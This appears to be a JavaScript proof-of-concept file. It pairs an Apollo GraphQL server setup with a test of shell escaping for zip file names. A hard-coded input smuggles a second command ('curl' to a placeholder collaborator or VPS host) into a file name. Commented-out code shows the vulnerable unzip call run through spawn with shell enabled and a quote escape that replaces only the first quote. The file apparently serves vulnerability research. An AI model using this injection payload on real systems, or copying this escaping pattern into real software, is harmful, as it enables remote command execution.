const { ApolloServer, gql } = require('apollo-server');

const { join, dirname, basename } = require('path');

import {DataProvider} from './data'

import { typeDefs, resolvers } from './graphql/index'

const {
  ApolloServerPluginLandingPageLocalDefault
} = require('apollo-server-core');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  csrfPrevention: true,
  cache: 'bounded',

  plugins: [
    ApolloServerPluginLandingPageLocalDefault({ embed: true }),
  ],
});

// const data =  DataProvider.create()

server.listen().then(({ url }) => {

  let input = "poc4.zip'';curl <COLLABORATOR-DOMAIN-OR-IP-OF-YOUR-VPS>;#"
  let dir = dirname(input);
  let zipName = basename(input);
  dir = dir.replace("'", "'\\''");
  zipName = zipName.replace("'", "'\\''") || './';

  let fixed = zipName.match(/^[a-zA-Z0-9\-]+\.zip/);

  console.log(`dir: ${dir} file: ${zipName}`);
  console.log(`fixed: ${fixed}`);

  console.log(`🚀  Server ready at ${url}`);
});

// const dir = dirname(path);
// const name = basename(path);
// const dirName = dir.replace("'", "'\\''");
// const zipName = name.replace("'", "'\\''");
// const toName = to.replace("'", "'\\''") || './';
// const cmd = ['unzip', '-o', `'${zipName}'`, '-d', `'${toName}'`];

// await new Promise((res, rej) => {
//   const command = spawn(cmd[0], cmd.slice(1), { cwd: dirName, shell: true });
//   command.stdout.on('data', () => {});
//   command.on('close', code => {
//     if (code !== 0) {
//       rej(new Error(`child process exited with code ${code}`));
//     } else {
//       res();
//     }
//   });
//   command.on('error', err => {
//     rej(err);
//   });
// });

// return to;